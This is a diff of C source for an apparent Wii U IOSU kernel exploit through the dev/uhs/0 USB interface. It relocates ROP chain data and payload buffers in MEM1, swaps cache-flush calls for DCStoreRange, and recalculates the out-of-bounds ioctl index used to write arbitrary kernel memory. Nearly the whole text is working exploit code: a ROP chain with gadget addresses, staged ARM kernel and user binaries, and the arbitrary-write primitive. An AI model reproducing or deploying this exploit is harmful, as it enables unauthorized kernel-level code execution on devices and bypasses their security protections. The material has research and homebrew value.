@@ -4,7 +4,7 @@
 #define CHAIN_START         0x1016AD40
 #define SHUTDOWN            0x1012EE4C
 #define SIMPLE_RETURN       0x101014E4
-#define SOURCE              (0x120000)
+#define SOURCE              0x01E20000
 #define IOS_CREATETHREAD    0x1012EABC
 #define ARM_CODE_BASE       0x08134100
 #define REPLACE_SYSCALL     0x081298BC
@@ -217,7 +217,7 @@ static const int final_chain[] = {
    sizeof(arm_kernel_bin),   // 0x1FC     our code size
    0x0,               // 0x200
    0x10123983,        // 0x204     POP {R1,R3,R4,R6,PC}
-   0x00140000,        // 0x208     our code source location
+   0x01E40000,        // 0x208     our code source location
    0x08131D04,        // 0x20C     KERNEL_MEMCPY address
    0x0,               // 0x210
    0x0,               // 0x214
@@ -233,7 +233,7 @@ static const int second_chain[] = {
    0x0,        // 0x08
    0x0,        // 0x0C
    0x101063db, // 0x10         POP {R1,R2,R5,PC}
-   0x00130000, // 0x14         source
+   0x01E30000, // 0x14         source
    sizeof(final_chain),          // 0x18         length
    0x0,        // 0x1C
    0x10106D4C, // 0x20         BL MEMCPY; MOV R0, #0; LDMFD SP!, {R4,R5,PC}
@@ -283,22 +283,8 @@ static const int second_chain[] = {
 static void uhs_exploit_init(unsigned int coreinit_handle);
 static int uhs_write32(unsigned int coreinit_handle, int dev_uhs_0_handle, int arm_addr, int val);
 
-void __main(void) {
-
-	unsigned int sound_handle = 0;
-	OSDynLoad_Acquire("sndcore2.rpl", &sound_handle);
-	if(sound_handle == 0)
-	{
-		/* Quit ongoing menu load music */
-		OSDynLoad_Acquire("snd_core.rpl", &sound_handle);
-		void (* AXInit)();
-		void (* AXQuit)();
-		OSDynLoad_FindExport(sound_handle, 0, "AXInit", &AXInit);
-		OSDynLoad_FindExport(sound_handle, 0, "AXQuit", &AXQuit);
-		AXInit();
-		AXQuit();
-	}
-
+void __main(void)
+{
 	unsigned int coreinit_handle;
 	OSDynLoad_Acquire("coreinit.rpl", &coreinit_handle);
 	unsigned int sysapp_handle;
@@ -337,58 +323,65 @@ void __main(void) {
 	OSExitThread(0);
 }
 
-static void uhs_exploit_init(unsigned int coreinit_handle) {
-   void (*DCFlushRange)(const void *addr, uint32_t length);
-   void (*DCInvalidateRange)(const void *addr, uint32_t length);
+static void uhs_exploit_init(unsigned int coreinit_handle)
+{
+   void (*DCStoreRange)(const void *addr, uint32_t length);
    void (*memcpy)(void *dst, const void *src, uint32_t length);
-   OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
-   OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
+   void (*memset)(void *dst, const char val, uint32_t length);
+   OSDynLoad_FindExport(coreinit_handle, 0, "DCStoreRange", &DCStoreRange);
    OSDynLoad_FindExport(coreinit_handle, 0, "memcpy", &memcpy);
+   OSDynLoad_FindExport(coreinit_handle, 0, "memset", &memset);
+
+   //! Clear out our used MEM1 area
+   memset((void*)0xF5E00000, 0, 0x00070000);
+   DCStoreRange((void*)0xF5E00000, 0x00070000);
 
    //!------Variables used in exploit------
-   int *pretend_root_hub = (int*)0xF5003ABC;
-   int *ayylmao = (int*)0xF4F00000;
+   int *pretend_root_hub = (int*)0xF5E60640;
+   int *ayylmao = (int*)0xF5E00000;
    //!-------------------------------------
 
    ayylmao[5] = 1;
-   ayylmao[8] = 0xF00000;
+   ayylmao[8] = 0x1E00000;
 
-   memcpy((char*)(0xF4120000), second_chain, sizeof(second_chain));
-   memcpy((char*)(0xF4130000), final_chain, sizeof(final_chain));
-   memcpy((char*)(0xF4140000), arm_kernel_bin, sizeof(arm_kernel_bin));
-   memcpy((char*)(0xF4148000), arm_user_bin, sizeof(arm_user_bin));
+   memcpy((char*)(0xF5E20000), second_chain, sizeof(second_chain));
+   memcpy((char*)(0xF5E30000), final_chain, sizeof(final_chain));
+   memcpy((char*)(0xF5E40000), arm_kernel_bin, sizeof(arm_kernel_bin));
+   memcpy((char*)(0xF5E50000), arm_user_bin, sizeof(arm_user_bin));
 
-   pretend_root_hub[33] = 0xF00000;
+   pretend_root_hub[33] = 0x1E00000;
    pretend_root_hub[78] = 0;
 
-   DCFlushRange(pretend_root_hub + 33, 200);      //! |Make CPU fetch new data (with updated vals)
-   DCInvalidateRange(pretend_root_hub + 33, 200);   //! |for "pretend_root_hub"
+   //! Store current CPU cache into main memory for IOSU to read
+   DCStoreRange(ayylmao, 0x840);
 
-   DCFlushRange((void*)0xF4120000, sizeof(second_chain));      //! |Make CPU fetch new data (with updated vals)
-   DCFlushRange((void*)0xF4130000, sizeof(final_chain));      //! |Make CPU fetch new data (with updated vals)
-   DCFlushRange((void*)0xF4140000, sizeof(arm_kernel_bin));      //! |Make CPU fetch new data (with updated vals)
-   DCFlushRange((void*)0xF4148000, sizeof(arm_user_bin));      //! |Make CPU fetch new data (with updated vals)
+   DCStoreRange((void*)0xF5E20000, sizeof(second_chain));
+   DCStoreRange((void*)0xF5E30000, sizeof(final_chain));
+   DCStoreRange((void*)0xF5E40000, sizeof(arm_kernel_bin));
+   DCStoreRange((void*)0xF5E50000, sizeof(arm_user_bin));
+
+   DCStoreRange(pretend_root_hub, 0x160);
 }
 
-static int uhs_write32(unsigned int coreinit_handle, int dev_uhs_0_handle, int arm_addr, int val) {
-   void (*DCFlushRange)(const void *addr, uint32_t length);
-   void (*DCInvalidateRange)(const void *addr, uint32_t length);
+static int uhs_write32(unsigned int coreinit_handle, int dev_uhs_0_handle, int arm_addr, int val)
+{
+   void (*DCStoreRange)(const void *addr, uint32_t length);
    void (*OSSleepTicks)(uint64_t ticks);
    int (*IOS_Ioctl)(int fd, uint32_t request, void *input_buffer,uint32_t input_buffer_len, void *output_buffer, uint32_t output_buffer_len);
-   OSDynLoad_FindExport(coreinit_handle, 0, "DCFlushRange", &DCFlushRange);
-   OSDynLoad_FindExport(coreinit_handle, 0, "DCInvalidateRange", &DCInvalidateRange);
+   OSDynLoad_FindExport(coreinit_handle, 0, "DCStoreRange", &DCStoreRange);
    OSDynLoad_FindExport(coreinit_handle, 0, "OSSleepTicks", &OSSleepTicks);
    OSDynLoad_FindExport(coreinit_handle, 0, "IOS_Ioctl", &IOS_Ioctl);
 
    //!------Variables used in exploit------
-   int *ayylmao = (int*)0xF4F00000;
+   int *ayylmao = (int*)0xF5E00000;
    //!-------------------------------------
 
-   ayylmao[520] = arm_addr - 24;                  //!  The address to be overwritten, minus 24 bytes
-   DCFlushRange(ayylmao, 521 * 4);                //! |Make CPU fetch new data (with updated adress)
-   DCInvalidateRange(ayylmao, 521 * 4);           //! |for "ayylmao"
-   OSSleepTicks(0x200000);                        //!  Improves stability
-   int request_buffer[] = { -(0xBEA2C), val };      //! -(0xBEA2C) gets IOS_USB to read from the middle of MEM1
+   ayylmao[520] = arm_addr - 24;                  //! The address to be overwritten, minus 24 bytes
+   DCStoreRange(ayylmao, 0x840);                  //! Store current CPU cache into main memory for IOSU to read
+   OSSleepTicks(0x200000);                        //! Wait for caches to refresh over in IOSU
+   //! index 0 is at 0x10149A6C, each index is 0x144 bytes long, so 0x10149A6C - (0x144*0xB349B) = 0x1E60640,
+   //! which is the physical address of 0xF5E60640 for us, right at the end of MEM1
+   int request_buffer[] = { -(0xB349B), val };
    int output_buffer[32];
    return IOS_Ioctl(dev_uhs_0_handle, 0x15, request_buffer, sizeof(request_buffer), output_buffer, sizeof(output_buffer));
 }
